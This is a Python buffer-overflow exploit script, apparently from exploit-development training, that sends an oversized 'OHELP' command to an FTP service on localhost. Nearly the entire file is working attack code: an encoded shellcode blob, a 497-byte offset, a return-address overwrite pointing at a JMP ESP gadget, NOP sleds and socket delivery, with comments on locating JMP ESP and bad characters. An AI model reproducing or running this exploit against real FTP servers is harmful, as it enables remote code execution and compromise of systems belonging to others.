#!/usr/bin/python

import sys, socket

shellcode = ("\xdb\xc8\xbb\x48\x69\x79\x67\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x31\x83\xc7\x09\x31\x5f\x14\x03\x5f\x5c\x8b\x8c\x9b\xb4\xc9"
"\x6f\x64\x44\xae\xe6\x81\x75\xee\x9d\xc2\x25\xde\xd6\x87\xc9"
"\x95\xbb\x33\x5a\xdb\x13\x33\xeb\x56\x42\x7a\xec\xcb\xb6\x1d"
"\x6e\x16\xeb\xfd\x4f\xd9\xfe\xfc\x88\x04\xf2\xad\x41\x42\xa1"
"\x41\xe6\x1e\x7a\xe9\xb4\x8f\xfa\x0e\x0c\xb1\x2b\x81\x07\xe8"
"\xeb\x23\xc4\x80\xa9\x3b\x09\xac\x7c\xb7\xf9\x5a\x7f\x11\x30"
"\xa2\x2c\x5c\xfd\x51\x2c\x98\x39\x8a\x5b\xd0\x3a\x37\x5c\x27"
"\x41\xe3\xe9\xbc\xe1\x60\x49\x19\x10\xa4\x0c\xea\x1e\x01\x5a"
"\xb4\x02\x94\x8f\xce\x3e\x1d\x2e\x01\xb7\x65\x15\x85\x9c\x3e"
"\x34\x9c\x78\x90\x49\xfe\x23\x4d\xec\x74\xc9\x9a\x9d\xd6\x87"
"\x5d\x13\x6d\xe9\x5e\x2b\x6e\x59\x37\x1a\xe5\x36\x40\xa3\x2c"
"\x73\xbe\xe9\x6d\xd5\x57\xb4\xe7\x64\x3a\x47\xd2\xaa\x43\xc4"
"\xd7\x52\xb0\xd4\x9d\x57\xfc\x52\x4d\x25\x6d\x37\x71\x9a\x8e"
"\x12\x12\x7d\x1d\xfe\xfb\x18\xa5\x65\x04")


# \x00\x04
# ^^^^ potential badchars

# to find JMP ESP make sure you click play to run the code to get all modules loaded
# then View Excutable Modules, click the module, click the CPU main thread box in top left
# then right click on it and choose Search For > Command and enter JMP ESP

# 76F95D33 is where JMP ESP is found in ADVAPI32
# \x33\x5D\xF9\x76 in little endian format
# the only one which does not rebase is the offsec dll itself
# 6a 96 66 83 "\x83\x66\x96\x6a"

cmd = "OHELP "
junk = "\x41" * 497
#junk = junk + "\xEF\xBE\xAD\xDE"
junk = junk + "\x13\x10\x11\x64"
junk = junk + "\x90" * 249
junk = junk + "\x90" * 16
junk = junk + "\x90" * 10
junk = junk + "\x90"
junk = junk + shellcode
junk = junk + "\x90" * 4
junk = junk + "\x90" * 30
junk = junk + "\x90" * 62
junk = junk + "\x90" *126
junk = junk + "\x90" *(10000-len(shellcode))
end = "\r\n"

buffer = cmd + junk + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 21))
s.send("anonymous")
s.send("123456")


s.send(buffer)
s.recv(1024)
s.close()
